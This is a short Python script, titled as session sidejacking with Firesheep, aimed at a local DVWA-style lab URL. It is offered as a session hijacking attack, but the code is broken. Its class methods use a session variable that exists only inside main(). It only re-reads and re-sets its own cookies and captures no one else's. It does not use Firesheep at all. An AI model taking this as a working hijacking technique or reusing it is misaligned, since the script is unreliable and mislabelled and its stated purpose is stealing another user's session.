```python
# Session Sidejacking using Firesheep
import requests

class SessionHijacking:

    def __init__(self, target_url):
        self.target_url = target_url

    def capture_session_cookie(self):
        response = s.get(self.target_url)
        session_cookie = s.cookies.get_dict()
        return session_cookie

    def impersonate_session_cookie(self, session_cookie):
        s.cookies.clear()
        s.cookies.update(session_cookie)

    def check_vulnerable_resource(self):
        response = s.get(self.target_url)
        return response.text

def main():
    target_url = "http://127.0.0.1:81/vulnerabilities/xss_d/"

    with requests.Session() as s:
        session_hijacker = SessionHijacking(target_url)

        # Capture and print the session cookie
        session_cookie = session_hijacker.capture_session_cookie()
        print("Captured Session Cookie:", session_cookie)

        # Impersonate the captured session
        session_hijacker.impersonate_session_cookie(session_cookie)
        
        # Check if the vulnerable resource can still be accessed
        response_text = session_hijacker.check_vulnerable_resource()
        print("Response from vulnerable resource:", response_text)

if __name__ == "__main__":
    main()
```
